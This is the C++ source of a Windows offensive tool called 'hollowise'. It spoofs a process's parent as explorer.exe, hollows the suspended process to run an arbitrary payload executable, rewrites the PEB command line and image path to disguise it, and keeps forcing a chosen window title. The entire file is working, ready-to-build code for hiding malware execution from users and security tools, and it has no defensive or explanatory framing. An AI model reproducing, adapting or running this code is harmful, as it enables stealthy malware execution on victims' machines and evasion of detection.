#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <winternl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <thread>

typedef NTSTATUS(WINAPI* NtQueryInformationProcess_t)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI* NtUnmapViewOfSection_t)(
	HANDLE ProcessHandle, 
	PVOID BaseAddress
	);

struct EnumWindowsParams {
	DWORD targetPID;
	HWND hwndMain;
};

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD GetProcessPID(const wchar_t* processName) {
	DWORD pid = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) return 0;

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(snapshot, &pe)) {
		do {
			if (wcscmp(pe.szExeFile, processName) == 0) {
				pid = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &pe));
	}
	CloseHandle(snapshot);
	return pid;
}

const wchar_t* ConvertToWideChar(const char* input) {
	if (!input) return nullptr;

	int size_needed = MultiByteToWideChar(CP_ACP, 0, input, -1, NULL, 0);
	wchar_t* wideString = new wchar_t[size_needed];
	MultiByteToWideChar(CP_ACP, 0, input, -1, wideString, size_needed);

	return wideString;
}

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
	EnumWindowsParams* params = (EnumWindowsParams*)lParam;
	DWORD wndProcID;
	GetWindowThreadProcessId(hwnd, &wndProcID);

	if (wndProcID == params->targetPID) {
		if (GetWindow(hwnd, GW_OWNER) == NULL && IsWindowVisible(hwnd)) {
			params->hwndMain = hwnd;
			return FALSE; 
		}
	}
	return TRUE; 
}

HWND GetMainWindowHandle(DWORD processID) {
	EnumWindowsParams params = { processID, NULL };
	EnumWindows(EnumWindowsCallback, (LPARAM)&params);
	return params.hwndMain;
}


bool ChangeWindowTitleByPID(DWORD pid, const wchar_t* newTitle) {
	HWND hwnd = GetMainWindowHandle(pid);
	if (!hwnd) {
		std::wcerr << L"[!]Error: Unable to find the window for PID: " << pid << std::endl;
		return false;
	}

	wchar_t currentTitle[256];
	int length = GetWindowTextW(hwnd, currentTitle, sizeof(currentTitle) / sizeof(wchar_t));

	if (length > 0 && wcscmp(currentTitle, newTitle) == 0) {
		return true;
	}

	if (SetWindowTextW(hwnd, newTitle)) {
		std::wcout << L"[+]Window title successfully changed to: " << newTitle << std::endl;
		return true;
	}
	else {
		return false;
	}
}


bool SetRemoteCurrentDirectory(HANDLE hProcess, const wchar_t* newDir) {
	PROCESS_BASIC_INFORMATION pbi;
	ULONG length;

	HINSTANCE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (!hNtdll) {
		std::cerr << L"[!]Error loading ntdll.dll" << std::endl;
		return false;
	}

	NtQueryInformationProcess_t NtQueryInformationProcess =
		(NtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) {
		std::cerr << L"[!]Error locating NtUnmapViewOfSection in ntdll.dll" << std::endl;
		return false;
	}

	if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &length) != 0) {
		std::cerr << L"[!]Error obtaining process informations" << std::endl;
		return false;
	}


	PEB peb;
	if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
		std::cerr << L"[!]Error reading PEB structure" << std::endl;
		return false;
	}


	
	RTL_USER_PROCESS_PARAMETERS params;
	if (!ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
		std::cerr << L"[!]Error reading process parameters" << std::endl;;
		return false;
	}

	if (!WriteProcessMemory(hProcess, params.CommandLine.Buffer, newDir,
		(wcslen(newDir) + 1) * sizeof(wchar_t), NULL)) {
		std::cerr << L"[!]Error writing CommandLine" << std::endl;;
		return false;
	}

	
	if (!WriteProcessMemory(hProcess, params.ImagePathName.Buffer, newDir,
		(wcslen(newDir) + 1) * sizeof(wchar_t), NULL)) {
		std::cerr << L"[!]Error writing ImagePathName" << std::endl;
		return false;
	}

	std::wcout << L"[+]CommandLine and ImagePathName parameters updated" << std::endl;
	return true;
}



bool PidSpoof(DWORD parentPID, const wchar_t* targetProcess, PROCESS_INFORMATION& pi) {
	STARTUPINFOEXW siex = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	siex.StartupInfo.cb = sizeof(STARTUPINFOEXW);

	SIZE_T size = 0;
	InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
	if (!InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size)) {
		std::cerr << "[!]Error while Attribute List init" << std::endl;
		return false;
	}

	HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPID);
	if (!hParent) {
		std::cerr << "[!]Error trying opening parent process" << std::endl;
		return false;
	}

	if (!UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
		std::cerr << "[!]Error updating Attribute List" << std::endl;
		return false;
	}

	BOOL success = CreateProcessW(
		targetProcess,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&siex.StartupInfo,
		&pi
	);

	DeleteProcThreadAttributeList(siex.lpAttributeList);
	HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
	CloseHandle(hParent);

	return success;
}

bool ProcessHollowing(PROCESS_INFORMATION& proc_info, const wchar_t* payloadPath) {


	HANDLE hPayloadFile = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hPayloadFile == INVALID_HANDLE_VALUE) {
		std::cerr << "[!]Error opening payload file. Code: " << GetLastError() << std::endl;
		return false;
	}

	DWORD payloadSize = GetFileSize(hPayloadFile, NULL);
	PBYTE payloadBuffer = new BYTE[payloadSize];
	DWORD bytesRead;

	//Read the payload to inject
	if (!ReadFile(hPayloadFile, payloadBuffer, payloadSize, &bytesRead, NULL)) {
		std::cerr << "[!]Error reading payload file" << std::endl;
		CloseHandle(hPayloadFile);
		delete[] payloadBuffer;
		return false;
	}
	CloseHandle(hPayloadFile);

	//Get the main thread context
	std::wcout << L"[+]Getting spoofed process thread context" << std::endl;
	LPCONTEXT pContext = new CONTEXT();
	pContext->ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(proc_info.hThread, pContext)) {
		std::cerr << "[!]Error getting spoofed process thread context" << std::endl;
		return false;
	}


	// Get The Base Address Of The Susspended Process
	PVOID BaseAddress;

#ifdef _X86_ 
	ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &BaseAddress, sizeof(PVOID), NULL);
#endif

#ifdef _WIN64
	ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &BaseAddress, sizeof(PVOID), NULL);
#endif

	// Getting The Addres Of NtUnmapViewOfSection And unmmaping All the Sections
	std::wcout << L"[+]Unmapping Section" << std::endl;
	HMODULE hNTDLL = GetModuleHandleW(L"ntdll.dll");
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
	NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)fpNtUnmapViewOfSection;
	if (NtUnmapViewOfSection(proc_info.hProcess, BaseAddress)) {
		std::cerr << L"[+]Error unmapping Section" << std::endl;
		return false;
	}


	// Getting The DOS Header And The NT Header Of The Mapped File
	PIMAGE_DOS_HEADER dos_head = (PIMAGE_DOS_HEADER)payloadBuffer;
	PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS)((LPBYTE)payloadBuffer + dos_head->e_lfanew);


	// Allocaation Memory In the Susspended Process;
	PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
#ifdef _X86_
	// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
	DWORD BaseOffset = (DWORD)BaseAddress - nt_head->OptionalHeader.ImageBase;
	std::wcout << L"[+]Original Process Base: 0x" << nt_head->OptionalHeader.ImageBase << "\nPayload file base : 0x" << BaseAddress << "\nOffset: 0x" << BaseOffset << std::endl;


	// Change The Files Base Address To The Base Address Of The Susspended Process
	nt_head->OptionalHeader.ImageBase = (DWORD)BaseAddress;
#endif
#ifdef _WIN64
	// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
	DWORD64 BaseOffset = (DWORD64)BaseAddress - nt_head->OptionalHeader.ImageBase;
	std::wcout << L"[+]Original process base address: 0x" << nt_head->OptionalHeader.ImageBase<< "\nPayload file base : 0x" << BaseAddress << "\nOffset: 0x"<<BaseOffset << std::endl;


	// Change The Files Base Address To The Base Address Of The Susspended Process
	nt_head->OptionalHeader.ImageBase = (DWORD64)BaseAddress;
#endif
	// Write The Files Headers To The Allocated Memory In The Susspended Process
	if (!WriteProcessMemory(proc_info.hProcess, BaseAddress, payloadBuffer, nt_head->OptionalHeader.SizeOfHeaders, 0)) {
		std::cerr << L"[!]Failed to write headers" << std::endl;
		return false;
	}

	// Write All The Sections From The Mapped File To the Susspended Process
	PIMAGE_SECTION_HEADER sec_head;

	std::wcout << L"[+]Writing sections:" << std::endl;
	//Loop Over Every Section
	for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++)
	{
		// Get The Head Of the Current Section
		sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)payloadBuffer + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		std::wcout << L"[+]0x" << (LPBYTE)mem + sec_head->VirtualAddress << " writing section" << sec_head->Name << std::endl;
		
		// Write The section From The File In the Allocated Memory
		if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((LPBYTE)mem + sec_head->VirtualAddress), (PVOID)((LPBYTE)payloadBuffer + sec_head->PointerToRawData), sec_head->SizeOfRawData, NULL)) {
			std::cerr << L"[!]Error writing section: " << sec_head->Name << " at: 0x" << (LPBYTE)mem + sec_head->VirtualAddress << std::endl;
		}
	}

	// Check If There Is an Offset Between the Base Addresses
	if (BaseOffset) {

		std::wcout << L"[+]Relocating the relocation table..." << std::endl;

		// Loop Over Evey Section
		for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++)
		{
			// Get The Head Of the Current Section
			sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)payloadBuffer + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

			// Compare The Section Name To The ".reloc" Section
			char pSectionName[] = ".reloc";
			if (memcmp(sec_head->Name, pSectionName, strlen(pSectionName))) {
				// If The Section Is Not The ".reloc" Section Conntinue To The Next Section
				continue;
			}

			// Get The Address Of the Section Data
			DWORD RelocAddress = sec_head->PointerToRawData;
			IMAGE_DATA_DIRECTORY RelocData = nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			DWORD Offset = 0;

			// Iterate Over The Relocation Table
			while (Offset < RelocData.Size) {

				// Get The Head Of The Relocation Block
				PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&payloadBuffer[RelocAddress + Offset];
				std::wcout  << L"[+]Relocation block 0x" << pBlockHeader->PageAddress << L" Size: " << pBlockHeader->BlockSize <<  std::endl;


				Offset += sizeof(BASE_RELOCATION_BLOCK);

				// Calculate The Entries In the Current Table
				DWORD EntryCount = (pBlockHeader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
				std::wcout << L"[+]" << EntryCount << L" entries must be realocated in the current block" << std::endl;

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&payloadBuffer[RelocAddress + Offset];

				for (int x = 0; x < EntryCount; x++)
				{
					Offset += sizeof(BASE_RELOCATION_ENTRY);

					// If The Type Of The Enrty Is 0 We Dont Need To Do Anything
					if (pBlocks[x].Type == 0) {
						std::wcout << L"[+]The type of base relocation is 0. Skipping" << std::endl;
						continue;
					}

					// Resolve The Adderss Of The Reloc
					DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;

#ifdef _X86_
					// Read The Value In That Address
					DWORD EnrtyAddress = 0;
					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
					std::wcout << L"[+]EntryAddress: 0x" << EnrtyAddress << " Offset: 0x" << EnrtyAddress + BaseOffset << " At 0x" << (PVOID)((DWORD)BaseAddress + FieldAddress << std::endl;



					// Add The Correct Offset To That Address And Write It
					EnrtyAddress += BaseOffset;
					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)) {
						std::cerr << "[!]Error Writing Entry" << std::endl;
					}
#endif
#ifdef _WIN64
					// Read The Value In That Address
					DWORD64 EnrtyAddress = 0;
					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
					std::wcout << L"[+]EntryAddress: 0x" << EnrtyAddress << " Offset: 0x" << (EnrtyAddress + BaseOffset) << " At 0x" << ((PVOID)((DWORD64)BaseAddress + FieldAddress)) << std::endl;

					// Add The Correct Offset To That Address And Write It
					EnrtyAddress += BaseOffset;
					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)) {
						std::cerr << "[!]Error writing entry" << std::endl;
					}
#endif
				}
			}
		}
	}

#ifdef _X86_
	// Write The New Image Base Address
	WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entrypoint
	DWORD EntryPoint = (DWORD)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
	pContext->Eax = EntryPoint;
#endif
#ifdef _WIN64
	// Write The New Image Base Address
	WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// Write The New Entrypoint
	DWORD64 EntryPoint = (DWORD64)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
	pContext->Rcx = EntryPoint;
#endif

	std::wcout << L"[+]Setting thread context" << std::endl;
	if (!SetThreadContext(proc_info.hThread, pContext)) {
		std::cerr << "[!]Error setting thread context" << std::endl;
		return false;
	}

	std::wcout << L"[+]Adjusting CommandLine and ImagePathName on PEB" << std::endl;
	

	if (!SetRemoteCurrentDirectory(proc_info.hProcess, payloadPath)) 
	{
		std::cerr << L"[!]Error adjusting CommandLine and ImagePathName on PEB" << std::endl;
		return false;
	}

	std::wcout << L"[+]Resuming thread" << std::endl;
	if (!ResumeThread(proc_info.hThread)) {
		std::cerr << L"[!]Error resuming thread" << std::endl;
		return false;
	}

	return true;
}


	






int main(int argc, char* argv[]) {
	std::cout << R"(
 _       _ _           _         
| |_ ___| | |___ _ _ _|_|___ ___ 
|   | . | | | . | | | | |_ -| -_|
|_|_|___|_|_|___|_____|_|___|___|                          
    )" << std::endl;
	std::wcout << L"hollowise 0.1" << std::endl;
	std::wcout << L"\"Master the Hollow, Stay Wise.\"\n" << std::endl;

	if (argc != 4) {
		printf("Usage: hollowise.exe [calc.exe] [inject.exe] [WindowTitle]\n");
		return 0;
	}

	DWORD parentPID = GetProcessPID(L"explorer.exe");
	if (parentPID == 0) {
		std::cerr << "[!]Error: unable to locate explorer.exe process" << std::endl;
		return -1;
	}

	std::wcout << L"[+]explorer.exe process found. PID:" << parentPID << std::endl;

	PROCESS_INFORMATION pi;
	if (!PidSpoof(parentPID, ConvertToWideChar(argv[1]), pi)) {
		std::cerr << "[!]Error while creating process with PPID spoofing technique" << std::endl;
		return -1;
	}

	std::wcout << L"[+]Process "<< argv[1] <<" created. PID: " << pi.dwProcessId << std::endl;

	
	if (!ProcessHollowing(pi, ConvertToWideChar(argv[2]))) {
		std::cerr << "[!]Error in process hollowing the payload" << argv[2] << " " << std::endl;
		return -1;
	}

	std::wcout << L"[+]" << argv[2] << L" payload hollowed successfully!" << std::endl;

	while (true) {
		ChangeWindowTitleByPID(pi.dwProcessId, ConvertToWideChar(argv[3]));
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

	return 0;
}
